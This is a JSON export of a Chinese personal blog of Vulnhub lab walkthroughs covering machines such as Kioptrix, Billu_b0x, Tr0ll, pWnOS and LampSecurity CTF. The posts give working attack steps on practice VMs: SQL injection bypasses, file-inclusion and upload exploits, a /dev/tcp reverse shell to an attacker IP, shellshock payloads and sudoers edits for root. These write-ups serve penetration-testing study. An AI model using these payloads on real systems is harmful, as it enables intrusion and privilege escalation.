{"meta":{"title":"ljxxxxx'blog","subtitle":"","description":"","author":"ljxxxxx","url":"http://ljx-go.top","root":"/"},"pages":[{"title":"categories","date":"2023-03-30T13:09:35.000Z","updated":"2023-03-30T13:09:35.057Z","comments":true,"path":"categories/index-1.html","permalink":"http://ljx-go.top/categories/index-1.html","excerpt":"","text":""},{"title":"categories","date":"2023-03-30T12:29:04.000Z","updated":"2023-03-30T13:14:47.523Z","comments":true,"path":"categories/index.html","permalink":"http://ljx-go.top/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-04-02T12:34:27.000Z","updated":"2023-04-02T12:34:27.188Z","comments":true,"path":"tags/index-2.html","permalink":"http://ljx-go.top/tags/index-2.html","excerpt":"","text":""},{"title":"标签","date":"2023-03-30T12:28:55.000Z","updated":"2023-04-02T12:35:04.463Z","comments":true,"path":"tags/index.html","permalink":"http://ljx-go.top/tags/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-04-02T13:24:10.000Z","updated":"2023-04-02T13:24:10.078Z","comments":true,"path":"tags/index-3.html","permalink":"http://ljx-go.top/tags/index-3.html","excerpt":"","text":""},{"title":"tags","date":"2023-03-30T13:08:52.000Z","updated":"2023-03-30T13:08:52.680Z","comments":true,"path":"tags/index-1.html","permalink":"http://ljx-go.top/tags/index-1.html","excerpt":"","text":""}],"posts":[{"title":"Kioptrix1.2","slug":"Kioptrix1.2","date":"2023-05-12T13:35:21.000Z","updated":"2023-05-15T06:39:38.040Z","comments":true,"path":"2023/05/12/Kioptrix1.2/","link":"","permalink":"http://ljx-go.top/2023/05/12/Kioptrix1.2/","excerpt":"","text":"信息收集nmap端口扫描 开启22&#x2F;80端口 目录扫描 web渗透 发现为LotuCMS 通过searchsploit搜索相关的漏洞利用文件，发现全是xss与crsf漏洞，比较难利用，于是通过搜索引擎搜索其他相关漏洞利用信息，发现以下文章lotuscms-3-0-eval-remote-command-execution 成功rce读取&#x2F;etc&#x2F;passwd文件 执行反弹shell 成功远程连接 提权发现数据库配置文件，获得数据库登陆账号密码：root&#x2F;fuckeyou 登陆数据库查看账号信息 获得后台登陆的adminz账号：admin&#x2F;n0t7t1k4 但对于提权的利用不大 获得系统中的用户名以及对应的加密密文 dreg&#x2F;0d3eccfb887aabd50f243b3f155c0f85 loneferret&#x2F;5badcaf789d3d1d09794d8f021f40f0e 在&#x2F;etc&#x2F;passwd能够查看到这两个用户 利用john爆破md5密文 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passwd 登陆 进一步提权CompanyPolicy.README文件提示ht命令是一个文件编辑器 通过sudo -l能够查看ht命令的执行权限是root权限，能够更改&#x2F;etc&#x2F;sudoers文件，在文件内添加&#x2F;bin&#x2F;bash命令执行权限，最后成功提权","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"Billu_b0x","slug":"Billu_b0x","date":"2023-05-09T16:33:18.000Z","updated":"2023-05-09T16:33:25.063Z","comments":true,"path":"2023/05/10/Billu_b0x/","link":"","permalink":"http://ljx-go.top/2023/05/10/Billu_b0x/","excerpt":"","text":"信息收集nnap 靶机IP地址为192.168.37.130 开放端口22,80 通过nmap内置漏洞扫描发现存在个别敏感路径 目录扫描 add.php为文件上传 test.php中提示file参数，疑似存在文件包含 WEB渗透get传参方式不成功，尝试POST传参 成功文件包含，查看敏感文件&#x2F;etc&#x2F;passwd index.php提示sql注入，add.php存在文件上传，可通过查看这两个源码进而代码审计是否存在文件上传漏洞and sql注入漏洞 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#curl -X POST --data &quot;file=index.php&quot; http://192.168.37.130/test.php#index.php&lt;?phpsession_start();include(&#x27;c.php&#x27;);include(&#x27;head.php&#x27;);if(@$_SESSION[&#x27;logged&#x27;]!=true)&#123; $_SESSION[&#x27;logged&#x27;]=&#x27;&#x27;;&#125;if($_SESSION[&#x27;logged&#x27;]==true &amp;&amp; $_SESSION[&#x27;admin&#x27;]!=&#x27;&#x27;)&#123; echo &quot;you are logged in :)&quot;; header(&#x27;Location: panel.php&#x27;, true, 302);&#125;else&#123;echo &#x27;&lt;div align=center style=&quot;margin:30px 0px 0px 0px;&quot;&gt;&lt;font size=8 face=&quot;comic sans ms&quot;&gt;--==[[ billu b0x ]]==--&lt;/font&gt; &lt;br&gt;&lt;br&gt;Show me your SQLI skills &lt;br&gt;&lt;form method=post&gt;Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;&lt;input type=submit name=login value=&quot;let\\&#x27;s login&quot;&gt;&#x27;;&#125;if(isset($_POST[&#x27;login&#x27;]))&#123; $uname=str_replace(&#x27;\\&#x27;&#x27;,&#x27;&#x27;,urldecode($_POST[&#x27;un&#x27;])); $pass=str_replace(&#x27;\\&#x27;&#x27;,&#x27;&#x27;,urldecode($_POST[&#x27;ps&#x27;])); $run=&#x27;select * from auth where pass=\\&#x27;&#x27;.$pass.&#x27;\\&#x27; and uname=\\&#x27;&#x27;.$uname.&#x27;\\&#x27;&#x27;; $result = mysqli_query($conn, $run);if (mysqli_num_rows($result) &gt; 0) &#123;$row = mysqli_fetch_assoc($result); echo &quot;You are allowed&lt;br&gt;&quot;; $_SESSION[&#x27;logged&#x27;]=true; $_SESSION[&#x27;admin&#x27;]=$row[&#x27;username&#x27;]; header(&#x27;Location: panel.php&#x27;, true, 302); &#125;else&#123; echo &quot;&lt;script&gt;alert(&#x27;Try again&#x27;);&lt;/script&gt;&quot;;&#125;&#125;echo &quot;&lt;font size=5 face=\\&quot;comic sans ms\\&quot; style=\\&quot;left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\\&quot;&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; &quot;;?&gt;select * from auth where pass=&#x27;&#x27;.$pass.&#x27;&#x27; and uname=&#x27;&#x27;.$uname.&#x27;&#x27; 登陆成功后会跳转到panel.php sql查询语句为：select * from auth where pass&#x3D;’password’ and uname&#x3D;’admin’ 其中str_replace函数对单引号进行过滤 此处可以构造语句 or 1&#x3D;1 –\\ 即可绕过，填充后的sql语句为 1select * from auth where pass=&#x27;or 1=1 --\\&#x27; and uname=&#x27;or 1=1 --\\&#x27; 成功登陆 和add.php一样存在文件上传。利用文件包含查看源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;?phpsession_start();include(&#x27;c.php&#x27;);include(&#x27;head2.php&#x27;);if(@$_SESSION[&#x27;logged&#x27;]!=true )&#123; header(&#x27;Location: index.php&#x27;, true, 302); exit();&#125;echo &quot;Welcome to billu b0x &quot;;echo &#x27;&lt;form method=post style=&quot;margin: 10px 0px 10px 95%;&quot;&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;&#x27;;if(isset($_POST[&#x27;lg&#x27;]))&#123; unset($_SESSION[&#x27;logged&#x27;]); unset($_SESSION[&#x27;admin&#x27;]); header(&#x27;Location: index.php&#x27;, true, 302);&#125;echo &#x27;&lt;hr&gt;&lt;br&gt;&#x27;;echo &#x27;&lt;form method=post&gt;&lt;select name=load&gt; &lt;option value=&quot;show&quot;&gt;Show Users&lt;/option&gt; &lt;option value=&quot;add&quot;&gt;Add User&lt;/option&gt;&lt;/select&gt; &amp;nbsp&lt;input type=submit name=continue value=&quot;continue&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&#x27;;if(isset($_POST[&#x27;continue&#x27;]))&#123; $dir=getcwd(); $choice=str_replace(&#x27;./&#x27;,&#x27;&#x27;,$_POST[&#x27;load&#x27;]); if($choice===&#x27;add&#x27;) &#123; include($dir.&#x27;/&#x27;.$choice.&#x27;.php&#x27;); die(); &#125; if($choice===&#x27;show&#x27;) &#123; include($dir.&#x27;/&#x27;.$choice.&#x27;.php&#x27;); die(); &#125; else &#123; include($dir.&#x27;/&#x27;.$_POST[&#x27;load&#x27;]); &#125;&#125;if(isset($_POST[&#x27;upload&#x27;]))&#123; $name=mysqli_real_escape_string($conn,$_POST[&#x27;name&#x27;]); $address=mysqli_real_escape_string($conn,$_POST[&#x27;address&#x27;]); $id=mysqli_real_escape_string($conn,$_POST[&#x27;id&#x27;]); if(!empty($_FILES[&#x27;image&#x27;][&#x27;name&#x27;])) &#123; $iname=mysqli_real_escape_string($conn,$_FILES[&#x27;image&#x27;][&#x27;name&#x27;]); $r=pathinfo($_FILES[&#x27;image&#x27;][&#x27;name&#x27;],PATHINFO_EXTENSION); $image=array(&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;gif&#x27;,&#x27;png&#x27;); if(in_array($r,$image)) &#123; $finfo = @new finfo(FILEINFO_MIME); $filetype = @$finfo-&gt;file($_FILES[&#x27;image&#x27;][&#x27;tmp_name&#x27;]); if(preg_match(&#x27;/image\\/jpeg/&#x27;,$filetype ) || preg_match(&#x27;/image\\/png/&#x27;,$filetype ) || preg_match(&#x27;/image\\/gif/&#x27;,$filetype )) &#123; if (move_uploaded_file($_FILES[&#x27;image&#x27;][&#x27;tmp_name&#x27;], &#x27;uploaded_images/&#x27;.$_FILES[&#x27;image&#x27;][&#x27;name&#x27;])) &#123; echo &quot;Uploaded successfully &quot;; $update=&#x27;insert into users(name,address,image,id) values(\\&#x27;&#x27;.$name.&#x27;\\&#x27;,\\&#x27;&#x27;.$address.&#x27;\\&#x27;,\\&#x27;&#x27;.$iname.&#x27;\\&#x27;, \\&#x27;&#x27;.$id.&#x27;\\&#x27;)&#x27;; mysqli_query($conn, $update); &#125; &#125; else &#123; echo &quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;; &#125; &#125; else &#123; echo &quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;; &#125;&#125;&#125;?&gt; 从代码中可以分析到文件的保存地址为：&#x2F;uploaded_images&#x2F; 在代码中存在文件上传，也存在任意文件包含，在load参数中 上传一个jpg文件，能够访问 利用burpsuite 对图片的数据内容进行修改，上传图片马，尝试修改load值查看是否能够访问 成功执行命令，重新上传反弹shell一句话木马获得反弹shell 提权方法一在phpmy中发现phpmyadmin配置文件，查看配置文件获得账号密码root&#x2F;roottoor 尝试ssh登陆 成功提权 方法二内核提权 lsb_release -a","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"Tr0ll","slug":"Tr0ll","date":"2023-05-08T08:49:18.000Z","updated":"2023-05-08T08:49:20.805Z","comments":true,"path":"2023/05/08/Tr0ll/","link":"","permalink":"http://ljx-go.top/2023/05/08/Tr0ll/","excerpt":"","text":"信息收集nmap扫描 主机ip地址为：192.168.37.129 主机开放端口：21，22，80 ftp匿名登陆成功匿名登陆，发现pcap流量数据包，get下载到本地用wireshark打开 pcap流量分析 RETR是FTP协议中的一个命令，”RETR”是”Retrieve”的缩写，指示FTP服务器将指定的文件发送到FTP客户端。 在FTP会话中，客户端可以使用”RETR”命令向服务器请求文件，服务器将文件作为响应发送回客户端。 FTP客户端将发送命令到FTP服务器，并等待服务器响应。如果文件存在并且客户端有足够的权限访问该文件，则FTP服务器将发送文件内容作为响应。客户端将接收到的数据写入本地文件，以完成下载过程。 在FTP-DATA协议中存在命令的响应内容，提示 sup3rs3cr3tdirlol，super secret dir 在web服务中访问一下该文件夹 80端口下载该文件 提示address 尝试访问&#x2F;0x0856BF&#x2F; 获得新目录 将新目录中的文件夹下载到本地查看内容 疑似which_one_lol.txt文件中的内容是用户名，此时思路就是用crackmapexec密码喷射破解 crackmapexec 命令介绍 CrackMapExec是一个开源的渗透测试工具，用于评估网络安全，它可以帮助安全专业人员评估网络中的弱点。CrackMapExec支持多种协议，如SMB、LDAP、HTTP等，可以用于口令破解、漏洞利用、信息收集等任务。 crackmapexec ssh –help –continue-on-success continues authentication attempts even after successes 出现报错为无法连接22端口，怀疑是服务器对短时间的ssh登陆进行限制。将文件内容倒转尝试 发现密码全是错误的，由于在该文件夹中存在密码的提示，尝试用文件名作为密码进行破解 成功破解出账号密码 提权 在ssh连接时，会出现这个导致ssh连接被关闭，怀疑设置了个定时任务，而该定时任务是来自root权限的定时任务，找出该任务并修改对应的脚本即可提权。 echo “overflow ALL&#x3D;(ALL)NOPASSWD:ALL” &gt;&gt; &#x2F;etc&#x2F;sudoers 成功提权","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"pWnOS","slug":"pWnOS","date":"2023-04-21T08:44:00.000Z","updated":"2023-04-21T09:01:57.943Z","comments":true,"path":"2023/04/21/pWnOS/","link":"","permalink":"http://ljx-go.top/2023/04/21/pWnOS/","excerpt":"","text":"信息收集主机发现 主机的ip地址为：192.168.37.156 端口扫描 Web渗透nmap结果显示10000端口存在可利用的漏洞 利用searchsploit查看漏洞利用 Arbitrary File Disclosure 任意文件泄露 将内容存放在hash.txt后用john破解获得密码 获得账号vmware 密码为h4ckm3 ssh连接 成功获得初始权限shell 提权通过2017.pl能够查看到shadow文件内容，而访问shadow文件时需要一定的root权限，可以看出这个perl脚本在进行文件包含的时候是拥有root权限的。此时将getshell 的perl脚本修改后缀名为.cgi上传至系统上，在使用2017.pl进行文件包含的时候，就能执行这个cgi程序，成功getshell。而此时获得的权限将是root权限 CGI程序可以是Python脚本，PERL脚本，SHELL脚本，C或者C++程序等。 上传路径应是&#x2F;home&#x2F;vmware，当前的初始shell就是用户vmware，能够在该文件夹中进行下载文件操作 cgi是程序，要记得给可执行权限 成功提权 方法二： 如果有试过免密登陆则会成功该文件 &#x2F;.ssh&#x2F;authorized_keys 生成的原因 在 SSH协议中，公钥认证是一种用于身份验证的方法。这种方法允许用户使用密钥对进行身份验证，而无需输入密码。公钥认证通常使用一对密钥来完成，一把是公钥，另一把是私钥。私钥通常保存在客户端，而公钥则被添加到服务器上的“authorized_keys”文件中。 当用户使用 SSH 连接到远程服务器时，SSH 会尝试匹配客户端发送的公钥和服务器上保存的公钥。如果匹配成功，用户就可以成功连接到服务器。 因此，&#x2F;.ssh&#x2F;authorized_keys 文件是用于保存公钥的文件，它的生成是为了在使用 SSH 连接时进行身份验证。当用户在客户端生成一对公钥和私钥时，用户需要将公钥复制到服务器上的 &#x2F;.ssh&#x2F;authorized_keys 文件中。这样，当用户使用 SSH 连接到服务器时，服务器可以使用保存在 authorized_keys 文件中的公钥来验证用户的身份。 敏感文件库 https://github.com/carlospolop/Auto_Wordlists 无思路可看 拿到这个文件，接下来就要用私钥对公钥进行碰撞 prng pseudo random number generator （伪随机数生成器） 按照这4个步骤使用 1.下载私钥公钥文件对 库的内容已经转移到gitLab 新网址：https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/5622.tar.bz2 解压后进入目录 grep -lr &#39;AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgv&#39; 对该目录下所有文件内容进行搜索，搜索文件中含有关键词AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM&#x2F;LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgv的文件 该pub文件内容是公钥，没有扩展名的文件则为私钥，查看私钥 成功获得系统初始shell 查看bash版本 当版本&lt;4.3 很可能存在shell shock漏洞 验证语句 1env x=&#x27;() &#123; :; &#125;; echo &quot;It is vulnerable&quot;&#x27; bash -c date 存在漏洞 创建1.cgi文件 并赋予可执行权限 1.cgi文件内容为 #!&#x2F;bin&#x2F;bash curl http://192.168.37.156:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/1.cgi -A &#39;() &#123; :; &#125;; /bin/echo &quot;vmware ALL=(ALL)ALL&quot; &gt;&gt; /etc/sudoers&#39; 将一个 sudo 权限的用户添加到 &#x2F;etc&#x2F;sudoers 文件中，从而使该用户获得 root 权限，可以执行任意命令。","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"pWnOS2","slug":"pWnOS2","date":"2023-04-19T13:51:15.000Z","updated":"2023-05-13T14:11:09.255Z","comments":true,"path":"2023/04/19/pWnOS2/","link":"","permalink":"http://ljx-go.top/2023/04/19/pWnOS2/","excerpt":"","text":"描述 需要设置网络 信息收集主机发现 靶机ip:10.10.10.101 端口扫描 只有80端口，目标明确直接开始web渗透 web渗透目录爆破 访问blog，存在一个登陆窗口 尝试sql注入失败 CMS指纹利用Ctrl + U 查看网页源码 发现网站的cms 用searchexploit查看exp 下载利用文件 perl 1191.pl执行 经测试-e中的1和2无法正常使用 尝试用3修改账号密码，登陆blog 出现一些新功能 文件上传文件上传，上传shell，尝试访问&#x2F;images&#x2F;shell.php 本地监听1234端口，反弹shell 提权存在root 用户and dan用户 查看mysqli_connect.php获得数据库账号密码 显示密码错误。大概是一个旧的数据库文件，利用全局搜索查看系统中是否还存在mysqli_connect.php文件 获得另一个新的账号密码 在mysql数据库的users表中查到内容 hash-identifier识别为SHA-1 https://hashes.com/en/decrypt/hash 在mysqli_connect.php中也存在账号密码登陆数据库，尝试用该密码登陆root账号 成功登陆（往往网站管理员会在不同地方设置相同的账号密码） 成功提权root用户","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"LampSecurityCTF7","slug":"LampSecurityCTF7","date":"2023-04-17T16:20:18.000Z","updated":"2023-04-21T15:00:46.528Z","comments":true,"path":"2023/04/18/LampSecurityCTF7/","link":"","permalink":"http://ljx-go.top/2023/04/18/LampSecurityCTF7/","excerpt":"","text":"信息收集主机发现 在使用nmap时，发现此靶机搜索不到ip。解决方案如下 CTF7靶机搜索不到ip问题 nmap -sn 192.168.37.0/24 靶机ip：192.168.37.153 端口扫描sudo nmap --min-rate=10000 -p- 192.168.37.153 sudo nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.37.153 存在两个web服务，分别在服务器上的80，8080端口上 nmap漏洞扫描sudo nmap --script=vuln -p22,80,137,138,139,901,5900,8080,10000 192.168.37.153 没有直接的关键信息 目录扫描web渗透80端口浏览发现存在账户登陆与创建账户 创建账户登陆后，发现疑似存在sql注入点 利用sqlmap尝试sql注入 sqlmap -u &quot;http://192.168.37.153/newsletter&amp;id=1&quot; --cookie=&quot;PHPSESSID=mt4a0vcp21m5koj76emphcsd73&quot; --dbs F12在console处输入document.cookie查看sessid sqlmap -u &quot;http://192.168.37.153/newsletter&amp;id=1&quot; --cookie=&quot;PHPSESSID=mt4a0vcp21m5koj76emphcsd73&quot; --dbs -D website --tables sqlmap -u &quot;http://192.168.37.153/newsletter&amp;id=1&quot; --cookie=&quot;PHPSESSID=mt4a0vcp21m5koj76emphcsd73&quot; --dbs -D website --tables -T users --columns 无password列，走不通 8080端口是一个登陆界面，尝试利用sql万能语句登陆 没有过滤直接成功登陆 应该是一个后台管理系统 在此处可以发表一篇Newsletters，而在80端口上可以查看到内容。 当内容是文本，无法反弹shell 发现文件上传，尝试用上传php文件反弹shell 成功上传php文件，此时就要获取shell.php所在的目录 通过目录爆破结果，访问&#x2F;assets，获得shell.php所在位置 点击shell.php后成功反弹shell 提权在&#x2F;var&#x2F;www&#x2F;admin&#x2F;inc目录上发现db.php文件，文件内容表示数据库无密码 登陆数据库 其中brain账户是存在登陆记录的，优先把目标放在它身上 将数据存放在data.txt中，并用awk分别分割username和password 存放在user.txt passwd.txt中 通过md5解密，将明文密码存放在1.txt中 挨个尝试后可知道对应的账号密码为：brian:my2cents 切换用户 成功提权 总结在80端口中尝试用sqlmap进行sql注入获得的内容和后续获得初始权限中的数据库内容一致，但不知道为何mysql无法爆出password列导致无法直接获得账号密码，有点奇怪。（待解决）","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"LampSecurityCTF5","slug":"LampSecurityCTF5","date":"2023-04-15T07:27:33.000Z","updated":"2023-04-15T07:41:58.603Z","comments":true,"path":"2023/04/15/LampSecurityCTF5/","link":"","permalink":"http://ljx-go.top/2023/04/15/LampSecurityCTF5/","excerpt":"","text":"信息收集主机发现sudo nmap -sn 192.168.37.0/24 主机IP：192.168.37.152 端口扫描sudo nmap --min-rate 10000 -p- 192.168.37.152 发现以上端口服务 sudo nmap -sT -sV -O -p22,25,80,110,111,139,143,445,901,3306 192.168.37.152 WEB渗透访问80端口 目录扫描dirsearch -u 192.168.37.152 -e * 存在好几个登陆入口 指纹利用在首页中点击Blog进入Andy Carp’s Blog页面，该博客以NanoCMS作为框架 存在需要管理员权限的RCE漏洞 存在一个信息泄露 访问&#x2F;data&#x2F;pagesdata.txt 一段序列化的内容，里面存放着passwd密文 用hash-indentifier密文识别 大概率是md5加密 密码为shannon 修改page内容，写入一句话木马反弹shell 访问 ../index.php?page=contact后 成功反弹shell 提权查看&#x2F;etc&#x2F;passwd文件，存在多个用户账号 “用户标识号” 用户的uid,一般情况下root为0，1-499默认为系统账号，有的更大些到1000，500-65535为用户的可登录账号，有的系统从1000开始。 用户比较多的情况下，利用全局搜索出关于相关用户的记录 grep -R -i pass /home/* 2&gt;/dev/null cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note standard in must be a tty 通常是由于命令在非交互式 shell 环境下运行而导致的。当您尝试在一个非交互式 shell 环境中运行需要从标准输入读取数据的命令时，就会出现这个错误. 因此通过python切换交互python -c &quot;import pty; pty.spawn(&#39;/bin/sh&#39;)&quot; 这个命令可以在当前终端创建一个交互式的 shell，通常用于在一个没有完整 shell 权限的终端中提升权限。 成功提权","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"LampSecurityCTF4","slug":"LampSecurityCTF4","date":"2023-03-28T16:15:15.000Z","updated":"2023-04-18T06:28:33.194Z","comments":true,"path":"2023/03/29/LampSecurityCTF4/","link":"","permalink":"http://ljx-go.top/2023/03/29/LampSecurityCTF4/","excerpt":"","text":"LampSecurityCTF4信息收集主机发现sudo nmap -sn 192.168.37.0/24 主机IP：192.168.37.148 端口扫描sudo nmap --min-rate=10000 -p- 192.168.37.148 sudo nmap -sT -sV -O -p22,25,80,631 192.168.37.148 目录扫描 robots.txt中显示 123456User-agent: *Disallow: /mail/Disallow: /restricted/Disallow: /conf/Disallow: /sql/Disallow: /admin/ /conf/访问报错,/restricted/,/mail/,/admin/都需要登录 /sql/目录可以直接查看,/sql/db.sql可以被直接访问,内容如下 12345use ehks;create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null); &#x2F;pages是一个目录，有blog.php等文件，与前端的页面内容一致，可能存在路径穿越 Web渗透sql注入 在测试中发现sql注入点 利用sqlmap获得数据库内容 sqlmap -u &#39;http://192.168.37.148/index.html?page=blog&amp;title=Blog&amp;id=2&#39; --dbs --dump --batch 均可进入/admin/后台,测试同样可以作为ssh连接并提权到root 在SSH连接时出现该错误，对其补足参数 sudo ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss pmoore@192.168.37.148 目录穿越上文提到url的访问格式是 index.html?page=blog&amp;title=Blog&amp;id=2推断源码为include($_GET[$page].&#39;.php&#39;) 利用whatweb分析出其php版本为5.1.2， php版本小于5.3.4，存在%00截断","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"Prime","slug":"Prime","date":"2023-03-17T13:11:15.000Z","updated":"2023-04-18T06:32:04.735Z","comments":true,"path":"2023/03/17/Prime/","link":"","permalink":"http://ljx-go.top/2023/03/17/Prime/","excerpt":"","text":"靶机介绍 This machine is designed for those one who is trying to prepare for OSCP or OSCP-Exam. This is first level of prime series. Some help at every stage is given. Machine is lengthy as OSCP and Hackthebox’s machines are designed. So you have a target to get root flag as well as user flag. If stuck on a point some help are given at a level of enumeration. If any extra help needed Visit our website http://hacknpentest.com and http://hnpsecurity.com. 靶机IP 信息收集nmap扫描sudo nmap --min-rate 10000 -p- 192.168.37.138 sudo nmap -sT -sV -O -p22,80 192.168.37.138 目录扫描dirsearch -u 192.168.37.138 -e * -x 403 &#x2F;dev 这是一个提示，我们通过扫描获得该提示，那说明我们再深度扫描一下 &#x2F;wordpress&#x2F;wp-login.php wordpress的后台登陆系统 &#x2F;wordpress wordpress框架 用dirb 再次扫描 dirb http://192.168.37.138 -X .txt,.zip &#x2F;secret.txt 这个提示告诉我需要对已找到的php页面进行模糊测试，找到一个正确的参数，同时这里也出现了一个location.txt需要我们去查看 其中给了个链接， 该链接是一个kali自带的用于模糊测试的工具 wfuzz dirb http://192.168.37.138 -X .php 寻找php页面 Fuzz&#x2F;image.php &#x2F;index.php 获得参数file 访问file 提示参数的内容不正确，尝试前面提示的location.txt文件 出现另一个参数secrettier360 该参数是image.php上的参数，这里应该是一个本地文件包含漏洞 文件包含curl http://192.168.37.138/image.php?secrettier360=../../../../../../etc/passwd 根据提示查看password.txt文件 curl http://192.168.37.138/image.php?secrettier360=../../../../../../home/saket/password.txt 拿到一个密码 follow_the_ippsec，尝试ssh连接，均失败。 Wordpress WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。 wpscan --url http://192.168.37.138/wordpress -e u 已知一个密码，此时思路是-e参数枚举wordpress后台用户名，获得用户名victor 成功登陆 登陆wordpress后台后，通常的思路是查看Plugins是否允许插入插件orAppearance&#x2F;Theme Editor处是否有可写权限的脚本文件 创建一个zip文件尝试上传，此路不通 在Theme Editor发现可修改secret.php文件，写入一句话木马反弹shell &lt;?php &quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&#39; &quot;?&gt; 接下来就是寻找secret.php文件的路径 WordPress主题存放在 “wp-content&#x2F;themes&#x2F;” 这个文件夹中，我们可以看到各自默认有几个主题文件夹，里面包含了所有的主题目录，并存储为一个目录。每个目录名称通常是一个主题名称。如果我们有需要添加新主题可以将主题的文件夹传到这个目录，然后在后台的外观主题可以激活设置当前主题。 &#x2F;wp-content&#x2F;themes&#x2F;twentynineteen&#x2F;secret.php 得到反弹shell 提权 提示了&#x2F;home&#x2F;saket&#x2F;目录 user.txt中存放密文，用md5解密无果，enc是一个可执行文件，执行时需要输入密码 此处我们可以通过find命令搜索backup文件 （backup文件会有一些关键信息） find / -name &#39;*backup*&#39; 2&gt;/dev/null | sort | less 忽略错误输出 使用“2&gt;&#x2F;dev&#x2F;null”将错误信息输出到“&#x2F;dev&#x2F;null”设备中，从而忽略错误输出。 在Linux系统中，每个进程都有三个标准文件描述符：标准输入（stdin）、标准输出（stdout）和标准错误（stderr）。这些文件描述符分别对应于文件描述符0、1和2。 当我们使用Linux命令时，它们通常会将标准输出和标准错误分别输出到终端，以便我们可以看到它们的输出结果。但是，有时候我们可能不希望看到标准错误的输出信息，可以通过将标准错误输出重定向到“&#x2F;dev&#x2F;null”设备中，从而将其忽略掉。 在命令中，“2”代表标准错误的文件描述符，”&gt;”代表重定向操作符，”&#x2F;dev&#x2F;null”代表一个特殊的设备文件，用于将所有数据丢弃而不保存。 因此，使用“2&gt;&#x2F;dev&#x2F;null”将错误信息输出到“&#x2F;dev&#x2F;null”设备中的意思是将标准错误输出重定向到“&#x2F;dev&#x2F;null”设备中，从而将其忽略掉。 找到opt&#x2F;backup&#x2F;server_database&#x2F;backup_pass 获得 密码：backup_password 成功运行enc文件生成密钥密文文件 提示用md5加密ippsec作为密码解密enc.txt 366a74cb3c959de17d61db30591c39d1 此处也可以用echo与md5sum进行md5加密——但要注意需要-n来取消字符串的换行符，否则加密会有误 利用openssl解密 1for i in $(cat txt);do echo &#x27;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&#x27; | openssl enc -d -a -K &#x27;33363661373463623363393539646531376436316462333035393163333964310a&#x27; -$i 2&gt;/dev/null; echo $i; done 最后解密的saket用户的密码为tribute_to_ippsec 切换账户并查看权限 执行提示的文件 &#x2F;home&#x2F;victor&#x2F;undefeated_victor 提示没找到challenge文件，尝试创建challenge文件并写入“&#x2F;bin&#x2F;bash” 